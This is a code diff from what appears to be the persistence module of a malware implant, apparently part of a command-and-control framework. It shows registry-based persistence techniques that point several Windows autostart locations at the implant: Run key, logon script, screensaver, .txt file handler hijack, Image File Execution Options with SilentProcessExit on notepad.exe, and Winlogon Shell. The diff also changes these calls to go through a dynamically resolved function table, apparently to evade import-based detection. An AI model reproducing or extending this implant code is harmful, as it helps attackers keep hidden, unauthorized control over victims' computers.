@@ -6,7 +6,7 @@ namespace Task
     {
         // Get current program (implant) path.
         WCHAR wSelfPath[MAX_PATH];
-        DWORD dwResult = GetModuleFileNameW(NULL, wSelfPath, MAX_PATH);
+        DWORD dwResult = pState->pProcs->lpGetModuleFileNameW(NULL, wSelfPath, MAX_PATH);
         if (dwResult == 0)
         {
             return L"Error: Failed to get the program path.";
@@ -21,7 +21,7 @@ namespace Task
             std::wstring wSubKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
             std::wstring wValue = Utils::Random::RandomString(8);
         
-            LONG result = RegOpenKeyExW(
+            LONG result = pState->pProcs->lpRegOpenKeyExW(
                 HKEY_CURRENT_USER,
                 wSubKey.c_str(),
                 0,
@@ -33,7 +33,7 @@ namespace Task
                 return L"Error: Failed to open key.";
             }
            
-            result = RegSetValueExW(
+            result = pState->pProcs->lpRegSetValueExW(
                 hKey,
                 wValue.c_str(),
                 0,
@@ -41,7 +41,7 @@ namespace Task
                 (BYTE*)lpSelfPath,
                 (wcslen(lpSelfPath) + 1) * sizeof(WCHAR)
             );
-            RegCloseKey(hKey);
+            pState->pProcs->lpRegCloseKey(hKey);
 
             if (result == ERROR_SUCCESS)
             {
@@ -57,7 +57,7 @@ namespace Task
             HKEY hKey;
             std::wstring wSubKey = L"Environment";
         
-            LONG result = RegOpenKeyExW(
+            LONG result = pState->pProcs->lpRegOpenKeyExW(
                 HKEY_CURRENT_USER,
                 wSubKey.c_str(),
                 0,
@@ -69,7 +69,7 @@ namespace Task
                 return L"Error: Failed to open key.";
             }
            
-            result = RegSetValueExW(
+            result = pState->pProcs->lpRegSetValueExW(
                 hKey,
                 L"UserInitMprLogonScript",
                 0,
@@ -77,7 +77,7 @@ namespace Task
                 (BYTE*)lpSelfPath,
                 (wcslen(lpSelfPath) + 1) * sizeof(WCHAR)
             );
-            RegCloseKey(hKey);
+            pState->pProcs->lpRegCloseKey(hKey);
 
             if (result == ERROR_SUCCESS)
             {
@@ -96,7 +96,7 @@ namespace Task
             const WCHAR* wActivate = L"1"; // 1 => Activate
             const WCHAR* wTimeOut = L"10";
 
-            if (RegOpenKeyExW(
+            if (pState->pProcs->lpRegOpenKeyExW(
                 HKEY_CURRENT_USER,
                 wSubKey.c_str(),
                 0,
@@ -108,7 +108,7 @@ namespace Task
             }
         
             // Create new registry keys.
-            if (RegSetValueExW(
+            if (pState->pProcs->lpRegSetValueExW(
                 hKey,
                 L"ScreenSaveActive",
                 0,
@@ -117,11 +117,11 @@ namespace Task
                 (wcslen(wActivate) + 1) * sizeof(WCHAR)
             ) != ERROR_SUCCESS)
             {
-                RegCloseKey(hKey);
+                pState->pProcs->lpRegCloseKey(hKey);
                 return L"Error: Failed to set value to registry.";
             }
 
-            if (RegSetValueExW(
+            if (pState->pProcs->lpRegSetValueExW(
                 hKey,
                 L"ScreenSaveTimeOut",
                 0,
@@ -130,11 +130,11 @@ namespace Task
                 (wcslen(wTimeOut) + 1) * sizeof(WCHAR)
             ) != ERROR_SUCCESS)
             {
-                RegCloseKey(hKey);
+                pState->pProcs->lpRegCloseKey(hKey);
                 return L"Error: Failed to set value to registry.";
             }
 
-            if (RegSetValueExW(
+            if (pState->pProcs->lpRegSetValueExW(
                 hKey,
                 L"SCRNSAVE.EXE",
                 0,
@@ -143,11 +143,11 @@ namespace Task
                 (wcslen(wSelfPath) + 1) * sizeof(WCHAR)
             ) != ERROR_SUCCESS)
             {
-                RegCloseKey(hKey);
+                pState->pProcs->lpRegCloseKey(hKey);
                 return L"Error: Failed to set value to registry.";
             }
 
-            RegCloseKey(hKey);
+            pState->pProcs->lpRegCloseKey(hKey);
             return L"Success: The entry has been set to HKCU\\" + wSubKey + L".";
         }
         else if (wcscmp(wTechnique.c_str(), L"default-file-extension-hijacking") == 0)
@@ -155,7 +155,7 @@ namespace Task
             HKEY hKey;
             std::wstring wSubKey = L"txtfile\\shell\\open\\command";
 
-            LONG result = RegOpenKeyExW(
+            LONG result = pState->pProcs->lpRegOpenKeyExW(
                 HKEY_CLASSES_ROOT,
                 wSubKey.c_str(),
                 0,
@@ -167,7 +167,7 @@ namespace Task
                 return L"Error: Failed to open key.";
             }
 
-            result = RegSetValueExW(
+            result = pState->pProcs->lpRegSetValueExW(
                 hKey,
                 L"",
                 0,
@@ -175,7 +175,7 @@ namespace Task
                 (BYTE*)lpSelfPath,
                 (wcslen(lpSelfPath) + 1) * sizeof(WCHAR)
             );
-            RegCloseKey(hKey);
+            pState->pProcs->lpRegCloseKey(hKey);
 
             if (result == ERROR_SUCCESS)
             {
@@ -197,7 +197,7 @@ namespace Task
             const WCHAR* wSilent = L"Software\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe";
 
             // GlobalFlag
-            if (RegCreateKeyExW(
+            if (pState->pProcs->lpRegCreateKeyExW(
                 HKEY_LOCAL_MACHINE,
                 wImg,
                 0,
@@ -212,7 +212,7 @@ namespace Task
                 return L"Error: Failed to create key: Image File Execution Options\\notepad.exe.";
             }
             
-            if (RegSetValueExW(
+            if (pState->pProcs->lpRegSetValueExW(
                 hKey,
                 L"GlobalFlag",
                 0,
@@ -221,12 +221,12 @@ namespace Task
                 sizeof(dwGF)
             ) != ERROR_SUCCESS)
             {
-                RegCloseKey(hKey);
+                pState->pProcs->lpRegCloseKey(hKey);
                 return L"Error: Failed to set key.";
             }
-            RegCloseKey(hKey);
+            pState->pProcs->lpRegCloseKey(hKey);
 
-            if (RegCreateKeyExW(
+            if (pState->pProcs->lpRegCreateKeyExW(
                 HKEY_LOCAL_MACHINE,
                 wSilent,
                 0,
@@ -238,11 +238,11 @@ namespace Task
                 nullptr
             ) != ERROR_SUCCESS)
             {
-                RegCloseKey(hKey);
+                pState->pProcs->lpRegCloseKey(hKey);
                 return L"Error: Failed to create key: SilentProcessExit\\notepad.exe.";
             }
             
-            if (RegSetValueExW(
+            if (pState->pProcs->lpRegSetValueExW(
                 hKey,
                 L"ReportingMode",
                 0,
@@ -251,10 +251,10 @@ namespace Task
                 sizeof(dwRM)
             ) != ERROR_SUCCESS)
             {
-                RegCloseKey(hKey);
+                pState->pProcs->lpRegCloseKey(hKey);
                 return L"Error: Failed to set ReportingMode.";
             }
-            if (RegSetValueExW(
+            if (pState->pProcs->lpRegSetValueExW(
                 hKey,
                 L"MonitorProcess",
                 0,
@@ -263,11 +263,11 @@ namespace Task
                 (wcslen(lpSelfPath) + 1) * sizeof(WCHAR)
             ) != ERROR_SUCCESS)
             {
-                RegCloseKey(hKey);
+                pState->pProcs->lpRegCloseKey(hKey);
                 return L"Error: Failed to set MonitorProcess.";
             }
 
-            RegCloseKey(hKey);
+            pState->pProcs->lpRegCloseKey(hKey);
             return L"Success: The entry has been set to HKLM\\" + std::wstring(wImg) + L" and HKLM\\" + std::wstring(wSilent) + L".";
         }
         else if (wcscmp(wTechnique.c_str(), L"scheduled-task") == 0)
@@ -280,7 +280,7 @@ namespace Task
             std::wstring wSubKey = L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
             std::wstring wValue = Utils::Random::RandomString(8);
 
-            LONG result = RegOpenKeyExW(
+            LONG result = pState->pProcs->lpRegOpenKeyExW(
                 HKEY_LOCAL_MACHINE,
                 wSubKey.c_str(),
                 0,
@@ -295,7 +295,7 @@ namespace Task
             std::wstring wExecutables = L"explorer.exe," + std::wstring(wSelfPath);
             LPCWSTR lpExecutables = wExecutables.c_str();
            
-            result = RegSetValueExW(
+            result = pState->pProcs->lpRegSetValueExW(
                 hKey,
                 L"Shell",
                 0,
@@ -303,7 +303,7 @@ namespace Task
                 (BYTE*)lpExecutables,
                 (wcslen(lpExecutables) + 1) * sizeof(WCHAR)
             );
-            RegCloseKey(hKey);
+            pState->pProcs->lpRegCloseKey(hKey);
 
             if (result == ERROR_SUCCESS)
             {
